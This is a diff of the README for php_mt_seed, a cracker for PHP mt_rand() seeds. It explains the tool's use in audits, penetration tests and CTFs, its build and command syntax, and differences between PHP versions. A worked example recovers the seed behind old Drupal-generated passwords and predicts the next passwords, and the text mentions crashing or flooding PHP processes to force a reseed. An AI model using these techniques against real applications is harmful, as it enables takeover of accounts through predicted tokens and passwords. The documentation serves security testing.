@@ -1,101 +1,300 @@
-This is a PHP mt_rand() seed cracker.  In the most trivial invocation
-mode, it finds possible seeds given the very first mt_rand() output
-after possible seeding with mt_srand().  With advanced invocation modes,
-it is also able to match multiple, non-first, and/or inexact mt_rand()
-outputs to possible seed values.
+	What is php_mt_seed?
 
-Currently, it attacks the mt_rand() algorithm of PHP versions 5.2.1
-through 7.0.x.  PHP below 5.2.1 is totally unsupported.  PHP 7.1.0+ is
-mostly unsupported, although in the simplest modes PHP 7.1.0+ seeds will
-occasionally be found (in those special cases where the algorithm does
-not deviate from 5.2.1's).
+php_mt_seed is a PHP mt_rand() seed cracker.  In the most trivial
+invocation mode, it finds possible seeds given the very first mt_rand()
+output after possible seeding with mt_srand().  With advanced invocation
+modes, it is also able to match multiple, non-first, and/or inexact
+mt_rand() outputs to possible seed values.
 
-Here's a sample run.  First generate a sample "random" number using PHP
-5.2.1 through 7.0.x:
+PHP's mt_rand() algorithm changed over the years since its introduction
+in PHP 3.0.6.  php_mt_seed 4.0 supports 3 major revisions of the
+algorithm: PHP 3.0.7 to 5.2.0, PHP 5.2.1 to 7.0.x, and PHP 7.1.0+ (at
+least up to the latest as of this writing, which is PHP 7.2.0beta3).
 
-$ php5 -r 'mt_srand(1234567890); echo mt_rand(), "\n";'
-1328851649
+php_mt_seed uses attack-optimized reimplementations of PHP's mt_rand()
+algorithms.  It is written in C with optional SIMD intrinsics (SSE2,
+SSE4.1/AVX, XOP, AVX2, AVX-512, as well as MIC) and OpenMP.  On a modern
+quad-core CPU, it is able to search the full 32-bit seed space in under
+a minute.  On second generation Xeon Phi, it does the same in 3 seconds.
 
-Now build and run the cracker (on an i7-4770K CPU, using 256-bit AVX2):
 
-$ make
-gcc -Wall -march=native -mtune=generic -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed
-php_mt_seed.c:47:2: warning: #warning AVX-512 not enabled. Try gcc -mavx512f (on Intel Knights Landing, Skylake-X, or some newer). [-Wcpp]
- #warning AVX-512 not enabled. Try gcc -mavx512f (on Intel Knights Landing, Skylake-X, or some newer).
-  ^
-$ time ./php_mt_seed 1328851649
-Found 0, trying 637534208 - 671088639, speed 90430384 seeds per second 
-seed = 658126103
-Found 1, trying 1207959552 - 1241513983, speed 90483861 seeds per second 
-seed = 1234567890
-Found 2, trying 4261412864 - 4294967295, speed 90495070 seeds per second 
-Found 2
+	Why crack mt_rand() seeds?
 
-real	0m47.464s
-user	6m17.200s
-sys	0m0.004s
+It is well-known that mt_rand() is a non-cryptographic PRNG and that its
+32-bit seed space would be too small for cryptographic applications.
+Yet many PHP applications misuse mt_rand() for purposes where a CSPRNG
+would be needed.  Thus, a use case of php_mt_seed is to demonstrate to
+developers and users of those applications just how very practical it is
+to attack mt_rand() and how vulnerable those applications are, so that
+the misuses of mt_rand() would decline.  Specific opportunities for such
+demonstration include source code audits and network/system penetration
+tests.  In the latter, the cracked seeds may allow the penetration test
+to proceed further into the network or system, potentially exposing
+other vulnerabilities there may be.  Other opportunities to practice
+with php_mt_seed include CTFs (capture the flag competitions).
 
-In under one minute of real time, it found the original seed, another
-seed that also produces the same mt_rand() output, and it searched the
-rest of the 32-bit seed space (not finding other matches).
+Common misuses of mt_rand() include generation of anti-CSRF tokens,
+custom session tokens (not relying on PHP's builtin sessions support,
+which uses a different PRNG yet was also vulnerable until recently),
+password reset tokens, passwords, database backup filenames, etc.  If
+one of these items is exposed and another is generated later without the
+web application or server reseeding the PRNG, then an attack is possible
+where the seed is cracked from the item generated earlier and is then
+used to infer the unknown item generated later.  For example, if an
+application generates (and necessarily exposes) an anti-CSRF token or a
+custom session token and then generates (and sends to the target user's
+registered e-mail address) a password reset token, then the latter may
+be inferred from the former, resulting in compromise of the target
+account (such as an admin account).  On web servers that do not
+reinitialize PHP (and thus do not reseed the PRNG) across PHP script
+invocations, inferring of another user's token or generated password
+from the attacker's own token or generated password may be possible as
+well, without needing more uses of mt_rand() in the application itself.
 
-Testing on a bigger machine (two E5-2670 v1 CPUs, using 128-bit AVX):
+As a curiosity, certain website encrypting ransomware misused mt_rand()
+as well, and seed cracking enabled quick recovery of the encryption key.
 
-$ time ./php_mt_seed 1328851649
-Found 0, trying 637534208 - 671088639, speed 233529013 seeds per second 
-seed = 658126103
-Found 1, trying 1207959552 - 1241513983, speed 235929600 seeds per second 
-seed = 1234567890
-Found 2, trying 4261412864 - 4294967295, speed 237802057 seeds per second 
-Found 2
 
-real	0m18.061s
-user	9m33.431s
-sys	0m0.007s
+	How to build php_mt_seed.
 
-Matching of multiple outputs:
+To build php_mt_seed from source on a system that has GCC and (GNU) make
+installed, simply type "make" in its directory.  For example, here's
+what this looks like on CentOS 7 running on a i7-4770K CPU (supporting
+SIMD instruction sets up to AVX2, so that's what php_mt_seed will use):
 
-$ php5 -r 'mt_srand(1234567890); for ($i = 0; $i < 10; $i++) { echo mt_rand(0, 9), " "; } echo "\n";'
-6 6 4 1 1 2 8 4 5 8
+    $ make
+    gcc -Wall -march=native -mtune=generic -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed
+    php_mt_seed.c:47:2: warning: #warning AVX-512 not enabled. Try gcc -mavx512f (on Intel Knights Landing, Skylake-X, or some newer). [-Wcpp]
+     #warning AVX-512 not enabled. Try gcc -mavx512f (on Intel Knights Landing, Skylake-X, or some newer).
+      ^
 
-On the same machine as above:
+(The warning tells us that a more advanced SIMD instruction set is not
+enabled in the build, in this case because the CPU actually lacks it.
+These warnings are safe to ignore, but they're sometimes useful in case
+non-default compiler flags are used and a SIMD instruction set would be
+left disabled inadvertently.)
 
-$ time ./php_mt_seed 6 6 0 9  6 6 0 9  4 4 0 9  1 1 0 9  1 1 0 9  2 2 0 9  8 8 0 9  4 4 0 9  5 5 0 9  8 8 0 9
-Pattern: EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10
-Found 0, trying 1207959552 - 1241513983, speed 218833252 seeds per second 
-seed = 1234567890
-Found 1, trying 4261412864 - 4294967295, speed 221372096 seeds per second 
-Found 1
 
-real	0m19.405s
-user	10m15.530s
-sys	0m0.021s
+	How to use php_mt_seed.
 
-Matching inexact outputs, if we had some uncertainty about the numbers:
+php_mt_seed should be run from the command line, with command-line
+arguments given to it according to the syntax described below.
 
-$ time ./php_mt_seed 6 6 0 9  6 6 0 9  4 4 0 9  1 1 0 9  1 1 0 9  2 2 0 9  7 8 0 9  4 4 0 9  0 0 0 0  8 8 0 9
-Pattern: EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 RANGE-FROM-10 EXACT-FROM-10 SKIP EXACT-FROM-10
-Found 0, trying 1207959552 - 1241513983, speed 214939422 seeds per second 
-seed = 1234567890
-Found 1, trying 1409286144 - 1442840575, speed 216148181 seeds per second 
-seed = 1414163717
-Found 2, trying 1879048192 - 1912602623, speed 217482429 seeds per second 
-seed = 1893625793
-Found 3, trying 2785017856 - 2818572287, speed 219120208 seeds per second 
-seed = 2804485451
-Found 4, trying 3791650816 - 3825205247, speed 219933341 seeds per second 
-seed = 3810276440
-Found 5, trying 4261412864 - 4294967295, speed 220228054 seeds per second 
-Found 5
+Usage of php_mt_seed can be trivial or complex, depending on use case
+details.  Here's a trivial usage example:
 
-real	0m19.503s
-user	10m14.207s
-sys	0m0.019s
+First generate a "random" number using PHP, e.g. with:
 
-Notice how "7 8 0 9" specifies a range of possible values (7 to 8), and
-"0 0 0 0" means to skip (ignore) this one mt_rand() output value.  In
-our case, this uncertainty results in several additional possible seeds
-being found.
+    $ php5 -r 'mt_srand(1234567890); echo mt_rand(), "\n";'
+    1328851649
+
+Then run the cracker (in this example, on the same system as we used for
+the build above):
+
+    $ time ./php_mt_seed 1328851649
+    Pattern: EXACT
+    Version: 3.0.7 to 5.2.0
+    Found 0, trying 0xfc000000 - 0xffffffff, speed 16261.0 Mseeds/s 
+    Version: 5.2.1+
+    Found 0, trying 0x1e000000 - 0x1fffffff, speed 91.8 Mseeds/s 
+    seed = 0x1fd65f9a = 534142874 (PHP 7.1.0+)
+    Found 1, trying 0x26000000 - 0x27ffffff, speed 91.9 Mseeds/s 
+    seed = 0x273a3517 = 658126103 (PHP 5.2.1 to 7.0.x; HHVM)
+    Found 2, trying 0x48000000 - 0x49ffffff, speed 91.9 Mseeds/s 
+    seed = 0x499602d2 = 1234567890 (PHP 5.2.1 to 7.0.x; HHVM)
+    seed = 0x499602d2 = 1234567890 (PHP 7.1.0+)
+    Found 4, trying 0xfe000000 - 0xffffffff, speed 91.9 Mseeds/s 
+    Found 4
+    
+    real    0m47.028s
+    user    6m15.211s
+    sys     0m0.015s
+
+php_mt_seed first searches for seeds for the legacy PHP 3.0.7 to 5.2.0,
+which it typically completes in a fraction of a second.  Then it
+proceeds to search for seeds for PHP 5.2.1 to 7.0.x and for PHP 7.1.0+
+simultaneously, which takes a while.
+
+In 47 seconds, it found the original seed (which in this specific case
+happens to produce this same mt_rand() output both with PHP 5.2.1 to
+7.0.x and with PHP 7.1.0+ due to similarities in their algorithms) and
+two other seeds that also produce the same mt_rand output (albeit one
+only with PHP 5.2.1 to 7.0.x and the other only with PHP 7.1.0+), and it
+searched the rest of the 32-bit seed space (not finding other matches).
+
+For reference, on a 16-core server with two E5-2670 v1 CPUs (supporting
+AVX, but not yet AVX2) the same trivial attack completes in 18 seconds,
+on Xeon Phi 5110P in 8 seconds, and on Xeon Phi 7290 in 3 seconds.
+
+You'll find a complex usage example further below.
+
+
+	Command-line syntax.
+
+php_mt_seed expects 1, 2, 4, or more numbers on its command line.  The
+numbers specify constraints on mt_rand() outputs.
+
+When invoked with only 1 number, that's the first mt_rand() output to
+find seeds for.
+
+When invoked with 2 numbers, those are the bounds (minimum and maximum,
+in that order) that the first mt_rand() output should fall within.
+
+When invoked with 4 numbers, the first 2 give the bounds for the first
+mt_rand() output and the second 2 give the range passed into mt_rand().
+
+When invoked with 5 or more numbers, each group of 4 and then the last
+group of 1, 2, or (usually) 4 are processed as above, where each group
+refers to a corresponding mt_rand() output.
+
+It is possible to have php_mt_seed skip (ignore) some mt_rand() outputs
+by listing for them 4 numbers that would match any output value.  By
+convention, this is typically done by listing "0 0 0 0", which literally
+means "the output must be from 0 to 0 as returned by mt_rand(0, 0)", a
+condition that is always true.
+
+
+	Complex usage example.
+
+Here's a script embedding the vulnerable password generation function
+from old versions of Drupal:
+
+    <?php
+    function user_password($length = 10) {
+      // This variable contains the list of allowable characters for the
+      // password. Note that the number 0 and the letter 'O' have been
+      // removed to avoid confusion between the two. The same is true
+      // of 'I', 1, and l.
+      $allowable_characters = 'abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    
+      // Zero-based count of characters in the allowable list:
+      $len = strlen($allowable_characters) - 1;
+    
+      // Declare the password as a blank string.
+      $pass = '';
+    
+      // Loop the number of times specified by $length.
+      for ($i = 0; $i < $length; $i++) {
+    
+        // Each iteration, pick a random character from the
+        // allowable string and append it to the password:
+        $pass .= $allowable_characters[mt_rand(0, $len)];
+      }
+    
+      return $pass;
+    }
+    
+    if ($argc === 2) {
+      mt_srand($argv[1]);
+    }
+    
+    echo user_password(), "\n";
+    echo user_password(), "\n";
+    echo user_password(), "\n";
+    ?>
+
+Given a password generated by that function, let's try to predict what
+password it'd generate next assuming no PRNG seed reset inbetween.
+First generate a bunch of passwords for an unknown seed (we let PHP seed
+the PRNG automatically, as non-ancient versions do):
+
+    $ php drupal.php
+    pAiwtk6Yed
+    HW9UPrqKWC
+    57CN74bkzL
+
+Let's pretend to know only the first password.  We need to convert it to
+inputs to php_mt_seed, which we may do with this script:
+
+    <?php
+    $allowable_characters = 'abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    $len = strlen($allowable_characters) - 1;
+    $pass = $argv[1];
+    for ($i = 0; $i < strlen($pass); $i++) {
+      $number = strpos($allowable_characters, $pass[$i]);
+      echo "$number $number 0 $len  ";
+    }
+    echo "\n";
+    ?>
+
+We don't actually need to look at its output ourselves, but for the sake
+of illustration here it is:
+
+    $ php pw2args.php pAiwtk6Yed
+    14 14 0 56  25 25 0 56  8 8 0 56  21 21 0 56  18 18 0 56  10 10 0 56  53 53 0 56  47 47 0 56  4 4 0 56  3 3 0 56  
+
+What we actually need is to pass that output to php_mt_seed:
+
+    $ time ./php_mt_seed `php pw2args.php pAiwtk6Yed`
+    Pattern: EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57
+    Version: 3.0.7 to 5.2.0
+    Found 0, trying 0xfc000000 - 0xffffffff, speed 4404.0 Mseeds/s 
+    Version: 5.2.1+
+    Found 0, trying 0xa0000000 - 0xa1ffffff, speed 210.0 Mseeds/s 
+    seed = 0xa1872e34 = 2709990964 (PHP 5.2.1 to 7.0.x; HHVM)
+    Found 1, trying 0xfe000000 - 0xffffffff, speed 210.1 Mseeds/s 
+    Found 1
+    
+    real    0m21.441s
+    user    11m21.957s
+    sys     0m0.034s
+
+This is 21 seconds on the 2x E5-2670 v1 server mentioned above, on
+which the trivial attack would run in 18 seconds.   There's some
+performance cost from the more advanced constraints on mt_rand() outputs
+(and especially from not rejecting unsuitable outputs as quickly as we
+would when searching for an exact output value), but in this case it's
+not very high.
+
+Now let's recompute this and further passwords from the cracked seed:
+
+    $ php drupal.php 2709990964
+    pAiwtk6Yed
+    HW9UPrqKWC
+    57CN74bkzL
+
+Here we are: it's the same three passwords we had above, out of which we
+used only the first one to infer the remaining two.
+
+For even more real-world complexity, what if someone else had already
+generated a password using the same instance of PHP (e.g., same mod_php
+child process), and the password we know is the second one after
+(automatic) seeding?  Let's convert that one to php_mt_seed outputs as
+well, and let's also tell php_mt_seed to skip 10 mt_rand() outputs (as
+the application would have spent them on the first generated password,
+presumably unknown to us) before attempting a match:
+
+    $ time ./php_mt_seed 0 0 0 0  0 0 0 0  0 0 0 0  0 0 0 0  0 0 0 0  0 0 0 0  0 0 0 0  0 0 0 0  0 0 0 0  0 0 0 0  `php pw2args.php HW9UPrqKWC`
+    Pattern: SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57
+    Version: 3.0.7 to 5.2.0
+    Found 0, trying 0xfc000000 - 0xffffffff, speed 1457.9 Mseeds/s 
+    Version: 5.2.1+
+    Found 0, trying 0xa0000000 - 0xa1ffffff, speed 128.9 Mseeds/s 
+    seed = 0xa1872e34 = 2709990964 (PHP 5.2.1 to 7.0.x; HHVM)
+    Found 1, trying 0xfe000000 - 0xffffffff, speed 128.9 Mseeds/s 
+    Found 1
+    
+    real    0m36.288s
+    user    19m14.502s
+    sys     0m0.031s
+
+We found the same seed as above, and would be able to infer the same
+passwords from it just like we did above (both the preceding and the
+next password relative to the only one we pretended to know), but now it
+took 36 seconds, which is double the time the trivial attack used to
+take.  There's much room for optimization here for future versions of
+php_mt_seed (and in fact the older php_mt_seed 3.4 would process this
+much faster due to it lacking support for PHP 7.1.0+).  Meanwhile, high
+and especially unknown SKIP counts are best avoided, which typically can
+be done through forcing the web server to allocate a fresh instance of
+PHP by setting up many connections (so that more instances of PHP would
+be created than the server had running previously) or by crashing an
+instance (so that it'd be restarted) via one of many non-security bugs
+or resource exhaustion in PHP (but first make sure you're authorized to
+do things like that).
+
+
+	Xeon Phi specifics.
 
 To build php_mt_seed for first generation Xeon Phi (Knights Corner),
 install Intel's C compiler and run "make mic".  To run php_mt_seed on
@@ -103,88 +302,159 @@ Xeon Phi, copy Intel C compiler's OpenMP runtime library (such as
 libiomp5.so) to the Xeon Phi card, e.g. using scp.  Then SSH in to the
 card and run a command like:
 
-$ LD_LIBRARY_PATH=. time ./php_mt_seed 1328851649
-Found 0, trying 536870912 - 805306367, speed 440058124 seeds per second 
-seed = 658126103
-Found 1, trying 1073741824 - 1342177279, speed 511305630 seeds per second 
-seed = 1234567890
-Found 2, trying 4026531840 - 4294967295, speed 579357099 seeds per second 
-Found 2
-real    0m 7.60s
-user    28m 45.01s
-sys     0m 3.78s
+    $ LD_LIBRARY_PATH=. time ./php_mt_seed 1328851649
+    Pattern: EXACT
+    Version: 3.0.7 to 5.2.0
+    Found 0, trying 0xe0000000 - 0xffffffff, speed 8947.8 Mseeds/s 
+    Version: 5.2.1+
+    Found 0, trying 0x10000000 - 0x1fffffff, speed 583.6 Mseeds/s 
+    seed = 0x1fd65f9a = 534142874 (PHP 7.1.0+)
+    Found 1, trying 0x20000000 - 0x2fffffff, speed 583.6 Mseeds/s 
+    seed = 0x273a3517 = 658126103 (PHP 5.2.1 to 7.0.x; HHVM)
+    Found 2, trying 0x40000000 - 0x4fffffff, speed 586.7 Mseeds/s 
+    seed = 0x499602d2 = 1234567890 (PHP 5.2.1 to 7.0.x; HHVM)
+    seed = 0x499602d2 = 1234567890 (PHP 7.1.0+)
+    Found 4, trying 0xf0000000 - 0xffffffff, speed 586.1 Mseeds/s 
+    Found 4
+    real    0m 7.82s
+    user    30m 17.88s
+    sys     0m 1.78s
 
 This is on a Xeon Phi 5110P.
 
 Advanced invocation modes work too, but the performance impact of the
-non-vectorized portions of code is higher than on regular CPUs:
+non-vectorized portions of code is higher than it is on regular CPUs:
 
-$ LD_LIBRARY_PATH=. time ./php_mt_seed 6 6 0 9  6 6 0 9  4 4 0 9  1 1 0 9  1 1 0 9  2 2 0 9  7 8 0 9  4 4 0 9  0 0 0 0  8 8 0 9
-Pattern: EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 RANGE-FROM-10 EXACT-FROM-10 SKIP EXACT-FROM-10
-Found 0, trying 1073741824 - 1342177279, speed 348617475 seeds per second 
-seed = 1234567890
-Found 1, trying 1342177280 - 1610612735, speed 356015193 seeds per second 
-seed = 1414163717
-Found 2, trying 1879048192 - 2147483647, speed 365573578 seeds per second 
-seed = 1893625793
-Found 3, trying 2684354560 - 2952790015, speed 372309925 seeds per second 
-seed = 2804485451
-Found 4, trying 3758096384 - 4026531839, speed 377318914 seeds per second 
-seed = 3810276440
-Found 5, trying 4026531840 - 4294967295, speed 378078107 seeds per second 
-Found 5
-real    0m 11.40s
-user    44m 38.16s
-sys     0m 1.67s
+    $ LD_LIBRARY_PATH=. time ./php_mt_seed 14 14 0 56  25 25 0 56  8 8 0 56  21 21 0 56  18 18 0 56  10 10 0 56  53 53 0 56  47 47 0 56  4 4 0 56  3 3 0 56
+    Pattern: EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57 EXACT-FROM-57
+    Version: 3.0.7 to 5.2.0
+    Found 0, trying 0xe0000000 - 0xffffffff, speed 1824.3 Mseeds/s 
+    Version: 5.2.1+
+    Found 0, trying 0xa0000000 - 0xafffffff, speed 247.0 Mseeds/s 
+    seed = 0xa1872e34 = 2709990964 (PHP 5.2.1 to 7.0.x; HHVM)
+    Found 1, trying 0xf0000000 - 0xffffffff, speed 246.9 Mseeds/s 
+    Found 1
+    real    0m 19.78s
+    user    1h 17m 56s
+    sys     0m 9.54s
 
 Building and running on second generation Xeon Phi (Knights Landing) and
 later doesn't necessarily require a special make target since those
 support AVX-512 (which recent gcc supports too) and doesn't necessarily
 require any runtime library tricks (perhaps not when Xeon Phi is the
-host CPU rather than a coprocessor).  Here are the same benchmarks on a
-Xeon Phi 7290 used as the host processor:
+host CPU rather than a coprocessor).  Also, the performance impact of
+the non-vectorized portions of code is lower than on first generation.
 
-$ time ./php_mt_seed 1328851649
-Found 0, trying 536870912 - 805306367, speed 1248537004 seeds per second
-seed = 658126103
-Found 1, trying 1073741824 - 1342177279, speed 1359166865 seeds per second
-seed = 1234567890
-Found 2, trying 4026531840 - 4294967295, speed 1453621602 seeds per second
-Found 2
 
-real    0m2.952s
-user    13m51.549s
-sys     0m1.213s
+	PHP version curiosities (which shouldn't matter to you).
 
-$ time ./php_mt_seed 6 6 0 9  6 6 0 9  4 4 0 9  1 1 0 9  1 1 0 9  2 2 0 9  7 8 0 9  4 4 0 9  0 0 0 0  8 8 0 9
-Pattern: EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 EXACT-FROM-10 RANGE-FROM-10 EXACT-FROM-10 SKIP EXACT-FROM-10
-Found 0, trying 1073741824 - 1342177279, speed 1130254551 seeds per second
-seed = 1234567890
-Found 1, trying 1342177280 - 1610612735, speed 1147160068 seeds per second
-seed = 1414163717
-Found 2, trying 1879048192 - 2147483647, speed 1181791315 seeds per second
-seed = 1893625793
-Found 3, trying 2684354560 - 2952790015, speed 1203746439 seeds per second
-seed = 2804485451
-Found 4, trying 3758096384 - 4026531839, speed 1224135629 seeds per second
-seed = 3810276440
-Found 5, trying 4026531840 - 4294967295, speed 1227601170 seeds per second
-Found 5
+While php_mt_seed supports 3 major revisions of PHP's mt_rand()
+algorithm and that sort of covers PHP 3.0.7 through 7.1.0+ (up to the
+latest as of this writing and probably beyond), the reality is somewhat
+trickier than that.  From older versions to newer:
 
-real    0m3.501s
-user    16m17.088s
-sys     0m0.096s
+As a mere historical curiosity, php_mt_seed is in fact able to crack
+seeds of PHP 3.0.6, which is the very first version that introduced
+mt_rand(), but only as long as no range was passed into mt_rand().  That
+version had broken support for ranges, and indeed there's no point in
+supporting that short-lived breakage in php_mt_seed now.  With this
+detail, php_mt_seed has some support for all mt_rand() capable versions
+of PHP released so far.
 
-This is when building with gcc 7.1.1.  The speeds with icc 17.0.4 happen
-to be around 10% worse.
+Then there's PHP 3.0.7 through 5.2.0, where Mersenne Twister's state
+initialization is with multiples of 69069.  This enables our stateless
+implementation to quickly jump to the state array element needed to
+compute the first mt_rand() output by using a precomputed value for
+69069 raised to the power 396 (mod 2**32), which is MT's M-1.  Another
+curiosity of those versions, which we take advantage of too, is that
+they treat adjacent even and odd seeds the same, so the effective seed
+space is 31-bit.
 
-All of the above benchmarks are on CPUs running at stock clocks, with
-turbo boost and HT enabled (where applicable).  Compiler versions vary
-(gcc 4.4.7 to 7.1.1; icc 14.0.0 and 17.0.4), and so do Linux
-distributions and kernel versions (which affects how threads are
-scheduled across the logical CPUs).  And yes, all of these are on Linux.
+PHP 3.0.6 to 4.1.2 used a default seed of 4357 (and thus also 4356) if
+mt_srand() was not called.  PHP 4.2.0 changed that to automatic seeding
+using system time and PHP process ID (still predictable and now also
+leaky, but no longer a constant), but there was "Bug #25007 rand &
+mt_rand seed RNG every call" until 4.3.3, which presumably affected how
+cracked seeds could (not) be used.
 
-The above benchmarks are of php_mt_seed 3.3.  Results should be the same
-and speeds similar for php_mt_seed 3.4, except that it should be
-slightly faster at skipping (ignoring) mt_rand() outputs (as requested
-with "0 0 0 0" in some of the examples).
+PHP 5.2.1 changed MT state initialization to MT authors' new recommended
+algorithm, which is no longer linear so we have to compute the first 397
+state elements (out of 624) even though in the simplest case we only
+need (and only store) the first and last one of those (or we could use a
+time-memory trade-off, which we currently don't).
+
+PHP 5.2.1 also introduced a bug into its implementation of MT (use of a
+wrong variable, whereas pre-5.2.1 code was correct in that respect).
+This bug lets us skip a few operations for every other seed, which we
+do, although this optimization is so minor that we could as well not
+bother.  PHP 7.1.0 fixed this bug (reverting to pre-5.2.1 code in that
+respect, so we use the same logic for pre-5.2.1 and 7.1.0+ there).
+
+In PHP versions from 3.0.7 to 7.0.x, if mt_rand() was called with its
+optional output range specified, a 31-bit (0 to 2147483647) MT PRNG
+output was scaled to that range using floating-point math.  This meant
+that if a range wider than 31-bit was requested on a 64-bit build of
+PHP, some values would never occur.  This also meant that even for most
+ranges smaller than 31-bit a bias was introduced (some output values
+became more likely than others), as compared to MT's raw output (which
+was relatively unbiased).
+
+PHP 7.1.0 tried to fix those biases by dropping the floating-point math
+and instead mapping the raw 32-bit MT PRNG outputs to the target range
+using integer modulo division.  To avoid inherent bias when the target
+range isn't a whole power of 2 of possible integer values, a loop was
+introduced to skip raw 32-bit PRNG outputs (until a suitable one is
+seen) that would result in such bias.  A bug in that code was found and
+reported due to work on php_mt_seed.  As it turned out, the loop only
+works right in 32-bit builds of PHP, and is ineffective on 64-bit
+(except with 64-bit ranges, see below).  Luckily, this actually makes
+things simpler for php_mt_seed, and currently php_mt_seed fully supports
+the behavior of 64-bit builds only (for ranges up to 0 to 2147483646).
+
+There's currently no intent to add to php_mt_seed the complication of
+bias-avoidance of 32-bit builds of PHP 7.1.0+, as well as of 64-bit
+builds of future versions where the bug will presumably get fixed.  What
+this means in practice is that for 32-bit builds of PHP and future
+versions of PHP, php_mt_seed may occasionally find wrong and miss
+correct seeds for mt_rand() invoked with a range, but the probability of
+this happening is very low except for very wide ranges that are not a
+whole power of 2 of possible integer values.  For example, mt_rand(0,
+61) or mt_rand(111, 222) are very unlikely to trigger the problem,
+mt_rand(0, 255) can't trigger the problem, whereas mt_rand(1000000000,
+2000000000) is somewhat likely to trigger it.  Such likely problematic
+ranges are probably rarely used and are of little relevance to uses of
+php_mt_seed.  Also, supporting this buggy vs. correct behavior would
+require treating 32- and 64-bit builds of PHP separately and reporting
+on them differently.
+
+PHP 7.1.0 also tried to introduce proper support for 64-bit ranges in
+64-bit builds.  It generates two raw 32-bit PRNG outputs to derive one
+mt_rand() output when the target range spans more than a 32-bit space.
+Unfortunately, the implementation is buggy in a way where it'd introduce
+biases into such mt_rand() outputs.  The bug will presumably get fixed
+as well, but regardless there's currently no intent to support wider
+than 31-bit ranges in php_mt_seed.  This is obscure functionality
+(arguably, originally an accidental misfeature, which the PHP developers
+didn't really have to make official) that is only available on 64-bit
+builds of PHP.  Currently, php_mt_seed does not allow specifying larger
+than 31-bit integers on its command line (it will report an error when a
+larger value is specified).
+
+Prior to PHP 7.1.0, mt_rand(0, 2147483647) was equivalent to mt_rand()
+without a range, and php_mt_seed still assumes so.  This assumption is
+no longer valid for PHP 7.1.0+, which means that when searching for
+seeds for PHP 7.1.0+ for mt_rand() called with a range specified, you
+can specify at most a range one smaller than that, thus "0 2147483646"
+being the maximum that php_mt_seed supports for those versions.
+
+
+	Contact info.
+
+Please check the php_mt_seed homepage for new versions:
+
+    http://www.openwall.com/php_mt_seed/
+
+If you have anything valuable to add or a non-trivial question to ask,
+you may contact the author of php_mt_seed at:
+
+    Solar Designer <solar at openwall.com>
